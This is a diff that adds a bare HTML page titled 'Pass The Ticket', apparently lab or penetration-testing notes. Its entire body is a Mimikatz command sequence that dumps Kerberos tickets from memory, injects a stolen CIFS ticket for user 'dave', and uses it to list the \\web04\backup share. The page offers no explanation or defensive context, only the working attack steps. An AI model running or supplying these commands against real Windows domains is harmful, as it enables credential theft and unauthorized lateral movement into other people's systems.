@@ -1,0 +1,18 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Pass The Ticket</title>
+</head><body>ls \\web04\backup<br/>
+<br/>
+privilege::debug<br/>
+<br/>
+sekurlsa::tickets /export<br/>
+<br/>
+dir *.kirbi<br/>
+<br/>
+kerberos::ptt [0;14f21c]-0-0-40810000-dave@cifs-web04.kirbi<br/>
+<br/>
+ls \\web04\backup<br/>
+<br/>
+</body></html>
